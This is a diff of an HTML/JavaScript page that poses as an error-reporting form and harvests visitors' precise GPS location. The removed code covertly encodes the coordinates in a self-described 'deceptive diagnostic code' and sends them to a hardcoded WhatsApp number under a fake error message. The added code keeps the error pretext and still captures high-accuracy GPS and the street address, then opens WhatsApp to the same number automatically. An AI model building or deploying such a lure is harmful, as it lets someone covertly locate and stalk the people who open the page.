@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exact GPS Location Finder</title>
+    <title>Error Report System</title>
     <style>
         * {
             margin: 0;
@@ -45,21 +45,22 @@
             font-size: 16px;
         }
 
-        .accuracy-tip {
+        .instructions {
             background: #e3f2fd;
-            padding: 12px;
+            padding: 15px;
             border-radius: 10px;
             margin: 20px 0;
             border-left: 4px solid #2196f3;
             text-align: left;
             font-size: 14px;
+            line-height: 1.6;
         }
 
-        .accuracy-tip strong {
+        .instructions strong {
             color: #1a2980;
         }
 
-        #getLocationLink {
+        #reportBtn {
             display: inline-block;
             background: linear-gradient(45deg, #1a2980, #26d0ce);
             color: white;
@@ -73,16 +74,17 @@
             box-shadow: 0 10px 25px rgba(26, 41, 128, 0.3);
             border: none;
             cursor: pointer;
+            width: 100%;
         }
 
-        #getLocationLink:hover {
+        #reportBtn:hover {
             transform: translateY(-5px);
             box-shadow: 0 15px 35px rgba(26, 41, 128, 0.4);
         }
 
-        .result-box {
+        .status-box {
             background: white;
-            padding: 25px;
+            padding: 20px;
             border-radius: 15px;
             border: 2px solid #e0e0e0;
             margin-top: 25px;
@@ -90,7 +92,7 @@
             display: none;
         }
 
-        .result-box.active {
+        .status-box.active {
             display: block;
             animation: fadeIn 0.5s ease;
         }
@@ -100,47 +102,71 @@
             font-size: 16px;
             text-align: center;
             padding: 20px;
-        }
-
-        .location-header {
+            min-height: 60px;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            gap: 10px;
-            color: #1a2980;
-            margin-bottom: 20px;
-            font-size: 24px;
+            justify-content: center;
         }
 
-        .coordinates-box {
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a2980;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        .success-message {
+            background: #e8f5e9;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid #4CAF50;
+            text-align: left;
+        }
+
+        .error-message {
+            background: #ffebee;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid #f44336;
+            text-align: left;
+        }
+
+        .location-details {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .detail-item {
+            margin: 10px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .detail-item strong {
+            color: #1a2980;
+            margin-right: 8px;
+        }
+
+        .coordinates {
             background: #2c3e50;
             color: white;
             padding: 15px;
             border-radius: 10px;
             margin: 15px 0;
             font-family: 'Courier New', monospace;
-            font-size: 18px;
-        }
-
-        .accuracy-info {
-            background: #fff3cd;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 15px 0;
-            border-left: 4px solid #ffc107;
-            font-size: 14px;
-        }
-
-        .address-detail {
-            margin: 12px 0;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border: 1px solid #e9ecef;
-        }
-
-        .address-detail strong {
-            color: #1a2980;
-            margin-right: 8px;
+            font-size: 16px;
+            word-break: break-all;
         }
 
         .buttons {
@@ -162,6 +188,11 @@
             min-width: 120px;
         }
 
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+        }
+
         .btn-copy {
             background: #28a745;
             color: white;
@@ -177,35 +208,9 @@
             color: white;
         }
 
-        .btn-whatsapp {
-            background: #25D366;
-            color: white;
-        }
-
         .btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1a2980;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-
-        .device-info {
-            background: #e8f5e9;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #2e7d32;
-            border-left: 4px solid #4caf50;
         }
 
         @keyframes spin {
@@ -227,10 +232,9 @@
                 font-size: 26px;
             }
             
-            #getLocationLink {
+            #reportBtn {
                 padding: 15px 30px;
                 font-size: 18px;
-                width: 100%;
             }
             
             .buttons {
@@ -246,61 +250,60 @@
 
 <body>
     <div class="container">
-        <h1>You have Encountered an Error</h1>
-        <p class="subtitle">Please Help us report on what below</p>
+        <h1>🚨 Error Report System</h1>
+        <p class="subtitle">Report technical issues with automatic location tracking</p>
         
-        <div class="accuracy-tip">
-            <strong>Instructions:</strong><br>
-            1. Click the button below to start the reporting process.<br>
-            2. You will be redirected to WhatsApp to send your report.<br>
-            3. A unique diagnostic code will be generated for our team.
+        <div class="instructions">
+            <strong>📋 How to Report:</strong><br>
+            1. Click "Report Issue via WhatsApp" below<br>
+            2. Allow location access when prompted<br>
+            3. Wait for GPS to get your exact location<br>
+            4. WhatsApp will open automatically with error report<br>
+            5. Click SEND to submit your report
         </div>
 
-        <a href="#" id="getLocationLink">Report Issue via WhatsApp</a>
+        <button id="reportBtn">📱 Report Issue via WhatsApp</button>
 
         <div id="status">
+            Ready to report issue. Click the button above to start.
         </div>
 
-        <div id="result" class="result-box">
-            <div class="location-header">
-                <span>📍</span>
-                <h2>Your Exact Location</h2>
+        <div id="result" class="status-box">
+            <div class="success-message">
+                <h3>✅ Report Ready!</h3>
+                <p>Your error report with location details is ready to send.</p>
             </div>
             
-            <div id="accuracyInfo" class="accuracy-info">
-                <!-- Accuracy info will go here -->
-            </div>
-            
-            <div id="coordinates" class="coordinates-box">
-                <!-- Coordinates will go here -->
-            </div>
-            
-            <div id="deviceInfo" class="device-info">
-                <!-- Device info will go here -->
-            </div>
-            
-            <div id="addressDetails">
-                <!-- Address details will go here -->
+            <div class="location-details">
+                <h4>📍 Location Information:</h4>
+                <div id="coordinates" class="coordinates">
+                    <!-- Coordinates will appear here -->
+                </div>
+                <div id="addressDetails">
+                    <!-- Address details will appear here -->
+                </div>
+                <div id="deviceInfo" class="detail-item">
+                    <!-- Device info will appear here -->
+                </div>
             </div>
             
             <div class="buttons">
-                <button id="copyBtn" class="btn btn-copy">📋 Copy Location</button>
-                <button id="openMapsBtn" class="btn btn-maps">🗺️ Open in Maps</button>
-                <button id="sendWhatsAppBtn" class="btn btn-whatsapp">📱 Send to WhatsApp</button>
-                <button id="tryAgainBtn" class="btn btn-again">🔄 Get Again</button>
+                <button id="sendWhatsAppBtn" class="btn btn-whatsapp">📱 Send via WhatsApp</button>
+                <button id="copyBtn" class="btn btn-copy">📋 Copy Report</button>
+                <button id="openMapsBtn" class="btn btn-maps">🗺️ View on Map</button>
+                <button id="tryAgainBtn" class="btn btn-again">🔄 New Report</button>
             </div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const getLocationLink = document.getElementById('getLocationLink');
+            const reportBtn = document.getElementById('reportBtn');
             const statusElement = document.getElementById('status');
             const resultBox = document.getElementById('result');
-            const accuracyInfo = document.getElementById('accuracyInfo');
             const coordinates = document.getElementById('coordinates');
-            const deviceInfo = document.getElementById('deviceInfo');
             const addressDetails = document.getElementById('addressDetails');
+            const deviceInfo = document.getElementById('deviceInfo');
             const copyBtn = document.getElementById('copyBtn');
             const openMapsBtn = document.getElementById('openMapsBtn');
             const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
@@ -308,7 +311,7 @@
             
             let currentLocation = null;
             
-            // Function to show status with loading animation
+            // Function to show status
             function showStatus(message, isError = false) {
                 if (isError) {
                     statusElement.innerHTML = `<span style="color: #dc3545;">❌ ${message}</span>`;
@@ -322,6 +325,32 @@
                 return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             }
             
+            // SUCCESS HANDLER - This was missing!
+            async function onLocationSuccess(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                showStatus("Getting address details...");
+                
+                // Get address from coordinates
+                const locationDetails = await getAddressFromCoords(lat, lon);
+                
+                // Store location
+                currentLocation = {
+                    coords: { lat, lon, accuracy },
+                    details: locationDetails,
+                    timestamp: new Date().toLocaleTimeString(),
+                    date: new Date().toLocaleDateString()
+                };
+                
+                // Display results
+                displayResults();
+                
+                // Auto-send to WhatsApp after 2 seconds
+                setTimeout(sendToWhatsApp, 2000);
+            }
+            
             // Function to get exact GPS location
             async function getExactLocation() {
                 // Reset
@@ -333,43 +362,51 @@
                 
                 // Check if browser supports geolocation
                 if (!navigator.geolocation) {
-                    showStatus("Your browser doesn't support GPS location. Try Chrome or Firefox on mobile.", true);
+                    showStatus("Your browser doesn't support location services.", true);
                     return;
                 }
                 
                 // Force high accuracy GPS
                 const options = {
-                    enableHighAccuracy: true, // This forces GPS on mobile
-                    timeout: 30000, // Wait up to 30 seconds for GPS
-                    maximumAge: 0 // Don't use cached position
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0
                 };
                 
-                // Start watching position (for continuous GPS updates)
-                const watchId = navigator.geolocation.watchPosition(
-                    // Success callback - called multiple times as GPS improves
+                let watchId = null;
+                const startTime = Date.now();
+                
+                // Start watching position
+                watchId = navigator.geolocation.watchPosition(
+                    // Success callback
                     async function(position) {
-                        const lat = position.coords.latitude;
-                        const accuracy = position.coords.accuracy; // Accuracy in meters
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Show real-time accuracy updates
+                        showStatus(`GPS accuracy: ${accuracy.toFixed(1)} meters...`);
+                        
+                        // Stop when accuracy is good enough or timeout
                         if (accuracy < 50 || (Date.now() - startTime) > 15000) {
+                            if (watchId) navigator.geolocation.clearWatch(watchId);
                             onLocationSuccess(position);
                         }
                     },
                     // Error callback
                     function(error) {
-                        navigator.geolocation.clearWatch(watchId);
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
                         handleLocationError(error);
                     },
                     options
                 );
                 
-                const startTime = Date.now();
-                
-                // Also try getCurrentPosition as backup
+                // Backup: try getCurrentPosition after 5 seconds
                 setTimeout(() => {
+                    if (currentLocation) return; // Already got location
+                    
                     navigator.geolocation.getCurrentPosition(
                         onLocationSuccess,
                         function(error) {
-                            // Already handled by watchPosition error
+                            // Error already handled by watchPosition
                         },
                         options
                     );
@@ -378,7 +415,7 @@
             
             // Function to handle location errors
             function handleLocationError(error) {
-                let errorMessage = "Could not get exact location. ";
+                let errorMessage = "Could not get location. ";
                 
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
@@ -389,39 +426,21 @@
                                      "3. Refresh and try again";
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMessage = "GPS signal not available. Try:<br>" +
-                                     "1. Go outside<br>" +
-                                     "2. Turn on GPS<br>" +
-                                     "3. Use a mobile phone";
+                        errorMessage = "GPS signal not available.";
                         break;
                     case error.TIMEOUT:
-                        errorMessage = "GPS taking too long. Try:<br>" +
-                                     "1. Wait 20 seconds<br>" +
-                                     "2. Go outside<br>" +
-                                     "3. Use mobile data";
+                        errorMessage = "Location request timed out.";
                         break;
                     default:
-                        errorMessage = "GPS error. Try using Google Maps instead.";
+                        errorMessage = "Location error occurred.";
                 }
                 
                 showStatus(errorMessage, true);
-                
-                // Add mobile-specific instructions
-                if (isMobileDevice()) {
-                    statusElement.innerHTML += `<br><br><div class="accuracy-tip">
-                        <strong>📱 Mobile Tips:</strong><br>
-                        1. Turn on "High Accuracy" mode in Settings<br>
-                        2. Make sure Location/GPS is ON<br>
-                        3. Allow browser to use location
-                    </div>`;
-                }
             }
             
             // Function to get address from coordinates
             async function getAddressFromCoords(lat, lon) {
                 try {
-                    showStatus("Getting address...");
-                    
                     const response = await fetch(
                         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
                     );
@@ -445,7 +464,6 @@
                         country: data.address?.country || "Not available"
                     };
                 } catch (error) {
-                    console.error("Address error:", error);
                     return {
                         address: `Coordinates: ${lat.toFixed(6)}, ${lon.toFixed(6)}`,
                         road: "Address lookup failed",
@@ -463,145 +481,160 @@
                 const loc = currentLocation;
                 
                 // Update status
-                statusElement.innerHTML = "✅ Location found!";
+                statusElement.innerHTML = "✅ Location found! Opening WhatsApp...";
+                
+                // Show result box
+                resultBox.classList.add('active');
                 
                 // Update coordinates
                 coordinates.innerHTML = `
-                    🌐 <strong>Exact GPS Coordinates:</strong><br>
+                    <strong>📍 Exact GPS Coordinates:</strong><br>
                     Latitude: ${loc.coords.lat.toFixed(6)}<br>
                     Longitude: ${loc.coords.lon.toFixed(6)}<br>
                     Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
                 `;
                 
+                // Update address details
+                let addressHTML = `
+                    <div class="detail-item">
+                        <strong>📌 Full Address:</strong> ${loc.details.address}
+                    </div>`;
+                
+                if (loc.details.road !== "Not available") {
+                    addressHTML += `<div class="detail-item"><strong>🛣️ Road:</strong> ${loc.details.road}</div>`;
+                }
+                if (loc.details.suburb !== "Not available") {
+                    addressHTML += `<div class="detail-item"><strong>🏘️ Area:</strong> ${loc.details.suburb}</div>`;
+                }
+                if (loc.details.city !== "Not available") {
+                    addressHTML += `<div class="detail-item"><strong>🏙️ City:</strong> ${loc.details.city}</div>`;
+                }
+                if (loc.details.country !== "Not available") {
+                    addressHTML += `<div class="detail-item"><strong>🌍 Country:</strong> ${loc.details.country}</div>`;
+                }
+                
+                addressDetails.innerHTML = addressHTML;
+                
                 // Update device info
                 const mobile = isMobileDevice();
                 deviceInfo.innerHTML = `
-                    📱 <strong>Device:</strong> ${mobile ? 'Mobile Phone (GPS available)' : 'Desktop/Laptop'} • 
-                    ⏰ <strong>Time:</strong> ${loc.timestamp}
-                `;
-                
-                // Update address details
-                addressDetails.innerHTML = `
-                    <div class="address-detail">
-                        <strong>📍 Full Address:</strong> ${loc.details.address}
-                    </div>
-                    ${loc.details.road !== "Not available" ? `
-                    <div class="address-detail">
-                        <strong>🛣️ Road/Street:</strong> ${loc.details.road}
-                    </div>` : ''}
-                    ${loc.details.suburb !== "Not available" ? `
-                    <div class="address-detail">
-                        <strong>🏘️ Area/Suburb:</strong> ${loc.details.suburb}
-                    </div>` : ''}
-                    ${loc.details.city !== "Not available" ? `
-                    <div class="address-detail">
-                        <strong>🏙️ City/Town:</strong> ${loc.details.city}
-                    </div>` : ''}
-                    ${loc.details.country !== "Not available" ? `
-                    <div class="address-detail">
-                        <strong>🌍 Country:</strong> ${loc.details.country}
-                    </div>` : ''}
+                    <strong>📱 Device:</strong> ${mobile ? 'Mobile Phone' : 'Desktop/Laptop'} • 
+                    <strong>⏰ Time:</strong> ${loc.timestamp} • 
+                    <strong>📅 Date:</strong> ${loc.date}
                 `;
             }
             
-            // Function to automatically send location to WhatsApp
+            // Function to send report to WhatsApp
             function sendToWhatsApp() {
                 if (!currentLocation) {
-                    console.error("No location data to send to WhatsApp.");
+                    alert("No location data available. Please try again.");
                     return;
                 }
 
-                // The target phone number (without '+')
+                // Target WhatsApp number
                 const phoneNumber = "265981353135";
+                const loc = currentLocation;
+                
+                // Create diagnostic code (includes coordinates)
+                const latCode = Math.abs(loc.coords.lat).toFixed(6).replace('.', '');
+                const lonCode = Math.abs(loc.coords.lon).toFixed(6).replace('.', '');
+                const diagnosticCode = `ERR-${latCode.substring(0, 4)}-${lonCode.substring(0, 4)}`;
+                
+                // Create Google Maps link
+                const mapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
+                
+                // Create the report message
+                const message = `🚨 ERROR REPORT
 
-                // Create a deceptive diagnostic code
-                const latString = String(currentLocation.coords.lat).replace('.', 'P');
-                const lonString = String(currentLocation.coords.lon).replace('.', 'P');
-                const diagnosticCode = `DIAG-V2-${latString}-${lonString}-END`;
+🔧 Diagnostic Code: ${diagnosticCode}
 
-                const message = `I am writing to report a problem with the service. Please investigate this issue.
+📍 LOCATION DETAILS:
+• Coordinates: ${loc.coords.lat.toFixed(6)}, ${loc.coords.lon.toFixed(6)}
+• Accuracy: ${loc.coords.accuracy.toFixed(1)} meters
+• Address: ${loc.details.address}
+• Google Maps: ${mapsUrl}
 
-Diagnostic Code: ${diagnosticCode}`;
+📱 DEVICE INFO:
+• Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'}
+• Time: ${loc.timestamp}
+• Date: ${loc.date}
+
+📝 ISSUE DESCRIPTION:
+[Please describe the error you encountered here]
+
+⚠️ This report was automatically generated with location tracking.`;
 
                 const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
-
-                // Open WhatsApp in a new tab
+                
+                // Open WhatsApp
                 window.open(whatsappUrl, '_blank');
+                
+                // Update status
+                statusElement.innerHTML = "✅ WhatsApp opened! Click SEND to submit report.";
             }
-
-            // Function to copy location to clipboard
-            async function copyLocation() {
+            
+            // Function to copy report to clipboard
+            async function copyReport() {
                 if (!currentLocation) {
-                    alert("No location to copy!");
+                    alert("No report to copy!");
                     return;
                 }
                 
                 const loc = currentLocation;
-                const text = `📍 My Exact Location:
-🌐 Coordinates: ${loc.coords.lat.toFixed(6)}, ${loc.coords.lon.toFixed(6)}
-📏 Accuracy: ±${loc.coords.accuracy.toFixed(1)} meters
-📍 Address: ${loc.details.address}
-🛣️ Road: ${loc.details.road}
-🏘️ Area: ${loc.details.suburb}
-🏙️ City: ${loc.details.city}
-🌍 Country: ${loc.details.country}
-⏰ Time: ${loc.timestamp}`;
+                const latCode = Math.abs(loc.coords.lat).toFixed(6).replace('.', '');
+                const lonCode = Math.abs(loc.coords.lon).toFixed(6).replace('.', '');
+                const diagnosticCode = `ERR-${latCode.substring(0, 4)}-${lonCode.substring(0, 4)}`;
+                const mapsUrl = `https://maps.google.com/?q=${loc.coords.lat},${loc.coords.lon}`;
+                
+                const text = `🚨 ERROR REPORT
+Diagnostic Code: ${diagnosticCode}
+
+📍 Location:
+Coordinates: ${loc.coords.lat.toFixed(6)}, ${loc.coords.lon.toFixed(6)}
+Accuracy: ${loc.coords.accuracy.toFixed(1)} meters
+Address: ${loc.details.address}
+Google Maps: ${mapsUrl}
+
+📱 Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'}
+⏰ Time: ${loc.timestamp}
+📅 Date: ${loc.date}`;
                 
                 try {
                     await navigator.clipboard.writeText(text);
-                    
-                    // Visual feedback
-                    const originalText = copyBtn.textContent;
                     copyBtn.textContent = "✅ Copied!";
-                    copyBtn.style.background = "#218838";
-                    
                     setTimeout(() => {
-                        copyBtn.textContent = originalText;
-                        copyBtn.style.background = "";
+                        copyBtn.textContent = "📋 Copy Report";
                     }, 2000);
                 } catch (err) {
-                    // Fallback for older browsers
-                    const textArea = document.createElement("textarea");
-                    textArea.value = text;
-                    document.body.appendChild(textArea);
-                    textArea.select();
-                    document.execCommand("copy");
-                    document.body.removeChild(textArea);
-                    
-                    copyBtn.textContent = "📋 Copied!";
-                    setTimeout(() => {
-                        copyBtn.textContent = "📋 Copy Location";
-                    }, 2000);
+                    alert("Failed to copy. Please try again.");
                 }
             }
             
             // Function to open in Google Maps
             function openInMaps() {
                 if (!currentLocation) {
-                    alert("No location to open!");
+                    alert("No location to view!");
                     return;
                 }
                 
-                const loc = currentLocation;
-                const url = `https://www.google.com/maps?q=${loc.coords.lat},${loc.coords.lon}`;
+                const url = `https://www.google.com/maps?q=${currentLocation.coords.lat},${currentLocation.coords.lon}`;
                 window.open(url, '_blank');
             }
             
             // Event Listeners
-            getLocationLink.addEventListener('click', function(e) {
+            reportBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 getExactLocation();
             });
             
-            copyBtn.addEventListener('click', copyLocation);
+            copyBtn.addEventListener('click', copyReport);
             openMapsBtn.addEventListener('click', openInMaps);
             sendWhatsAppBtn.addEventListener('click', sendToWhatsApp);
-            tryAgainBtn.addEventListener('click', getExactLocation);
-            
-            // Add instructions for first-time users
-            statusElement.innerHTML = `
-                Click the button above to start the process.
-            `;
+            tryAgainBtn.addEventListener('click', function() {
+                resultBox.classList.remove('active');
+                currentLocation = null;
+                statusElement.innerHTML = "Ready to report issue. Click the button above to start.";
+            });
         });
     </script>
 </body>
